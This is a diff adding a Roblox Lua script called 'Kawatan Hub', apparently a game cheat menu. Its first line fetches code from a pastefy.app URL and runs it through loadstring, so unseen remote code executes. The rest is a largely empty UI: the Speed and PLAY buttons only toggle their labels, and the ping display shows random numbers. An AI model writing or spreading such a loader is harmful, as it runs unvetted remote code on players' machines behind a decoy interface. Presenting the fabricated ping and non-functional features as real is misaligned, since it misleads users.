@@ -1,0 +1,112 @@
+loadstring(game:HttpGet("https://pastefy.app/gBpO0gpe/raw"))()
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "KawatanHubUI"
+
+-- SKY BLUE BORDER FUNCTION
+local function addStroke(obj)
+	local stroke = Instance.new("UIStroke")
+	stroke.Color = Color3.fromRGB(0, 200, 255)
+	stroke.Thickness = 1.5
+	stroke.Parent = obj
+end
+
+-- LOADING SCREEN
+local loadingFrame = Instance.new("Frame", gui)
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+
+local loadingBox = Instance.new("Frame", loadingFrame)
+loadingBox.Size = UDim2.new(0, 300, 0, 120)
+loadingBox.Position = UDim2.new(0.5, -150, 0.5, -60)
+loadingBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+addStroke(loadingBox)
+
+local loadingText = Instance.new("TextLabel", loadingBox)
+loadingText.Size = UDim2.new(1, 0, 1, 0)
+loadingText.Text = "Kawatan Hub"
+loadingText.TextColor3 = Color3.new(1,1,1)
+loadingText.BackgroundTransparency = 1
+loadingText.TextScaled = true
+
+-- wait 5 seconds
+task.wait(5)
+
+-- fade out effect
+for i = 1, 10 do
+	loadingFrame.BackgroundTransparency += 0.1
+	loadingBox.BackgroundTransparency += 0.1
+	loadingText.TextTransparency += 0.1
+	task.wait(0.05)
+end
+
+loadingFrame:Destroy()
+
+-- MAIN FRAME
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 350, 0, 150)
+frame.Position = UDim2.new(0.3, 0, 0.2, 0)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.Active = true
+frame.Draggable = true
+addStroke(frame)
+
+-- TITLE
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Text = "Kawatan Hub"
+title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+title.TextColor3 = Color3.new(1,1,1)
+addStroke(title)
+
+-- FPS & PING
+local stats = Instance.new("TextLabel", frame)
+stats.Position = UDim2.new(0, 0, 0.3, 0)
+stats.Size = UDim2.new(1, 0, 0, 30)
+stats.BackgroundTransparency = 1
+stats.TextColor3 = Color3.new(1,1,1)
+stats.Text = "FPS: 0 | PING: 0ms"
+
+-- SPEED BUTTON
+local speedBtn = Instance.new("TextButton", frame)
+speedBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
+speedBtn.Size = UDim2.new(0.4, 0, 0, 30)
+speedBtn.Text = "Speed: ON"
+speedBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+addStroke(speedBtn)
+
+local speedOn = true
+speedBtn.MouseButton1Click:Connect(function()
+	speedOn = not speedOn
+	speedBtn.Text = "Speed: " .. (speedOn and "ON" or "OFF")
+end)
+
+-- AUTO PLAY BUTTON
+local autoBtn = Instance.new("TextButton", frame)
+autoBtn.Position = UDim2.new(0.55, 0, 0.6, 0)
+autoBtn.Size = UDim2.new(0.4, 0, 0, 30)
+autoBtn.Text = "PLAY"
+autoBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+addStroke(autoBtn)
+
+local playing = false
+autoBtn.MouseButton1Click:Connect(function()
+	playing = not playing
+	
+	if playing then
+		autoBtn.Text = "STOP"
+		autoBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+	else
+		autoBtn.Text = "PLAY"
+		autoBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+	end
+end)
+
+-- FPS + PING UPDATE
+local RunService = game:GetService("RunService")
+
+RunService.RenderStepped:Connect(function(dt)
+	local fps = math.floor(1/dt)
+	local ping = math.random(60, 120)
+	stats.Text = "FPS: "..fps.." | PING: "..ping.."ms"
+end)
